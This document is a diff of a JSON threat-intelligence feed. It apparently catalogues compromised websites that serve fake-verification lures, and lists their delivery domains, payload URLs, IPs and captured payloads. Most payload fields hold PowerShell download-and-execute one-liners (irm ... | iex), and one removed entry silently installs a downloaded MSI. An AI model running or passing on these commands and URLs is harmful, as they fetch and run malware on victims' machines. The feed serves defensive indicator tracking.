@@ -1,5 +1,140 @@
 [
   {
+    "UrlDomain": "hanmadang.at",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/cd42c370ba111a89"
+    ],
+    "IP": [
+      "159.69.241.33"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/cd42c370ba111a89')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/cd42c370ba111a89"
+    ],
+    "ReportId": "cmwlfjdna1inz0omlu82l8eee",
+    "ScannedAt": "2026-11-18T01:15:32.751000+00:00"
+  },
+  {
+    "UrlDomain": "yyy.06services.it",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/72f1e6202bcdac15"
+    ],
+    "IP": [
+      "77.39.213.99"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/72f1e6202bcdac15')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/72f1e6202bcdac15"
+    ],
+    "ReportId": "cmwlfj2tz1img0omlarvww2vu",
+    "ScannedAt": "2026-11-18T01:15:18.730000+00:00"
+  },
+  {
+    "UrlDomain": "songbirdartgallery.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/1ab42bce486721d7",
+      "https://songbirdartgallery.com/"
+    ],
+    "IP": [
+      "116.202.244.166"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/1ab42bce486721d7')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/1ab42bce486721d7"
+    ],
+    "ReportId": "cmwlfivnr1ilb0omlg7jm24vm",
+    "ScannedAt": "2026-11-18T01:15:09.036000+00:00"
+  },
+  {
+    "UrlDomain": "skiptonaesthetics.co.uk",
+    "DeliveryUrl": [
+      "browse-cloud.codes",
+      "base.gateway.tenderly.co"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "217.160.0.13"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/354fef1345fed255",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://base.gateway.tenderly.co",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/354fef1345fed255'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/354fef1345fed255"
+    ],
+    "ReportId": "cmwlf35i01ikh0omllasbe9x1",
+    "ScannedAt": "2026-11-18T01:02:55.695000+00:00"
+  },
+  {
+    "UrlDomain": "webperfology.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes",
+      "script.google.com",
+      "claude-flare-verification.vercel.app"
+    ],
+    "PayloadUrl": [
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://claude-flare-verification.vercel.app/win"
+    ],
+    "IP": [
+      "172.67.169.215"
+    ],
+    "Related": [
+      {
+        "Value": "https://mellow-arc-willow-craeyn.pro/t.js?site=c0f267170abf5e4c4e6e06b8fa2b572b",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "...' \"' + escapeCmdExeQuotedArg(APPS_SCRIPT_URL) + '\"'; // Wrap in cmd.exe /c \"...\" with CMD-style doubled quotes so paste works // in both CMD and PowerShell...",
+    "ResolvedDownloadUrl": [],
+    "ReportId": "cmwlf2lxn1ijq0omlk8itykij",
+    "ScannedAt": "2026-11-18T01:02:30.368000+00:00"
+  },
+  {
+    "UrlDomain": "nitmedia.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes",
+      "script.google.com",
+      "claude-flare-verification.vercel.app"
+    ],
+    "PayloadUrl": [
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://claude-flare-verification.vercel.app/win"
+    ],
+    "IP": [
+      "151.101.194.159"
+    ],
+    "Related": [
+      {
+        "Value": "https://kiln-bruiyn-ncuas.pro/t.js?site=9ccdccf86455f7c6777775d18c52beeb",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "...' \"' + escapeCmdExeQuotedArg(APPS_SCRIPT_URL) + '\"'; // Wrap in cmd.exe /c \"...\" with CMD-style doubled quotes so paste works // in both CMD and PowerShell...",
+    "ResolvedDownloadUrl": [],
+    "ReportId": "cmwlf23n91ij10omln7rjkh67",
+    "ScannedAt": "2026-11-18T01:02:06.654000+00:00"
+  },
+  {
     "UrlDomain": "jrveventos.com.br",
     "DeliveryUrl": [
       "browse-cloud.codes",
@@ -4973,69 +5108,5 @@
     ],
     "ReportId": "cmwfqf7a40ivv0oml8u89k1od",
     "ScannedAt": "2026-11-14T01:33:36.554000+00:00"
-  },
-  {
-    "UrlDomain": "www.mediweld.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "89.46.106.52"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/5f16a861fec93d5c",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&amp;_v=29910323",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/5f16a861fec93d5c'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/5f16a861fec93d5c"
-    ],
-    "ReportId": "cmwfq2sdt0iq70omlfqlpffxx",
-    "ScannedAt": "2026-11-14T01:23:57.427000+00:00"
-  },
-  {
-    "UrlDomain": "kirketerpthaarup.dk",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "46.30.213.96"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwfpywm20ikw0omloshmzs1c",
-    "ScannedAt": "2026-11-14T01:20:56.286000+00:00"
-  },
-  {
-    "UrlDomain": "20wawo30.com",
-    "DeliveryUrl": [
-      "github.pw"
-    ],
-    "PayloadUrl": [
-      "https://github.pw/Girya/1a887bc54c6d3982"
-    ],
-    "IP": [
-      "153.127.54.82"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://github[.]pw/Girya/1a887bc54c6d3982')|iex",
-    "ResolvedDownloadUrl": [
-      "https://github.pw/Girya/1a887bc54c6d3982"
-    ],
-    "ReportId": "cmwfpwgss0ihy0omlygayvwid",
-    "ScannedAt": "2026-11-14T01:19:02.441000+00:00"
   }
 ]
